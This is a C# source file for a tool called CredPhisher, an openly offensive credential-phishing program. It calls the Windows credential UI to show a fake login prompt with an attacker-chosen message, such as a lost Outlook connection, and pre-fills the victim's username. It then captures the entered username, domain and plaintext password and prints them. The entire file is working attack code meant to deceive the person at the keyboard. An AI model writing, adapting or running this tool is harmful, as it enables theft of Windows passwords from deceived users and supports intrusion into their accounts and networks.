using System;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace CredPhisher
{
    class MainClass
    {
        [DllImport("ole32.dll")]
        public static extern void CoTaskMemFree(IntPtr ptr);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
        private struct CREDUI_INFO
        {
            public int cbSize;
            public IntPtr hwndParent;
            public string pszMessageText;
            public string pszCaptionText;
            public IntPtr hbmBanner;
        }

        [DllImport("credui.dll", CharSet = CharSet.Auto)]
        private static extern bool CredUnPackAuthenticationBuffer(int dwFlags,
            IntPtr pAuthBuffer,
            uint cbAuthBuffer,
            StringBuilder pszUserName,
            ref int pcchMaxUserName,
            StringBuilder pszDomainName,
            ref int pcchMaxDomainame,
            StringBuilder pszPassword,
            ref int pcchMaxPassword);

        [DllImport("credui.dll", CharSet = CharSet.Auto)]
        private static extern int CredUIPromptForWindowsCredentials(ref CREDUI_INFO notUsedHere,
            int authError,
            ref uint authPackage,
            IntPtr InAuthBuffer,
            uint InAuthBufferSize,
            out IntPtr refOutAuthBuffer,
            out uint refOutAuthBufferSize,
            ref bool fSave,
            int flags);

        public static void Collector(string message, out NetworkCredential networkCredential)
        {
            CREDUI_INFO credui = new CREDUI_INFO();
            string username = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            credui.pszCaptionText = message;
            credui.pszMessageText = "Please enter the credentials for " + username;
            credui.cbSize = Marshal.SizeOf(credui);
            uint authPackage = 0;
            IntPtr outCredBuffer = new IntPtr();
            uint outCredSize;
            bool save = false;
            int result = CredUIPromptForWindowsCredentials(ref credui,
                0,
                ref authPackage,
                IntPtr.Zero,
                0,
                out outCredBuffer,
                out outCredSize,
                ref save,
                1);

            var usernameBuf = new StringBuilder(100);
            var passwordBuf = new StringBuilder(100);
            var domainBuf = new StringBuilder(100);

            int maxUserName = 100;
            int maxDomain = 100;
            int maxPassword = 100;
            if (result == 0)
            {
                if (CredUnPackAuthenticationBuffer(0, outCredBuffer, outCredSize, usernameBuf, ref maxUserName,
                    domainBuf, ref maxDomain, passwordBuf, ref maxPassword))
                {
                    CoTaskMemFree(outCredBuffer);
                    networkCredential = new NetworkCredential()
                    {
                        UserName = usernameBuf.ToString(),
                        Password = passwordBuf.ToString(),
                        Domain = domainBuf.ToString()
                    };
                    return;
                }
            }
            networkCredential = null;
        }

        static void Main(string[] args)
        {
            if (args.Length == 0){
                Console.WriteLine("[-] Please supply the message that will be displayed to the target (ex. 'Windows has lost connection to Outlook')");
                Environment.Exit(1);
            }
            try
            {
                Collector(args[0], out NetworkCredential networkCredential);
                Console.WriteLine("[+] Collected Credentials:\r\n" +
                    "Username: " + networkCredential.Domain + "\\" + networkCredential.UserName + "\r\n" +
                    "Password: " + networkCredential.Password);
            }
            catch (NullReferenceException) 
            {
                Console.WriteLine("[-] User exited prompt");
            }
            catch (Exception)
            {
                Console.WriteLine("[-] Looks like something went wrong...");
            }
            
        }
    }
}